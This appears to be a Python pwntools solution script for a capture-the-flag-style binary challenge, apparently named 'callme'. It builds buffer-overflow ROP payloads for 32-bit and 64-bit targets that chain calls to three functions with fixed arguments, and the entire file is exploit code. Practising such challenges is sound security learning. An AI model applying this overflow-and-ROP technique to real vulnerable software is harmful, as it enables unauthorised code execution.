from pwn import *

def solve32():
    callmeOneAddress = p32(0x80485c0)
    callmeTwoAddress = p32(0x8048620)
    callmeThreeAddress = p32(0x80485b0)
    pop_pop_ret = p32(0x080488a9)
    payload = 'a'*44 + callmeOneAddress + pop_pop_ret + p32(0x1) + p32(0x2) + p32(0x3) + callmeTwoAddress + pop_pop_ret + p32(0x1) + p32(0x2) + p32(0x3) + callmeThreeAddress + p32(0x08048799) + p32(0x1) + p32(0x2) + p32(0x3)
    return payload

def solve64():
    popToRegs = p64(0x0000000000401ab0)
    callmeOneAddress = p64(0x401850)
    callmeTwoAddress = p64(0x401870)
    callmeThreeAddress = p64(0x401810)
    testReturn = p64(0x00000000004019f4)

    payload = 'a'*40 + popToRegs + p64(0x1) + p64(0x2) + p64(0x3) + callmeOneAddress
    payload += popToRegs + p64(0x1) + p64(0x2) + p64(0x3) + callmeTwoAddress
    payload += popToRegs + p64(0x1) + p64(0x2) + p64(0x3) + callmeThreeAddress
    payload += testReturn

    return payload

# print solve32()
print solve64()
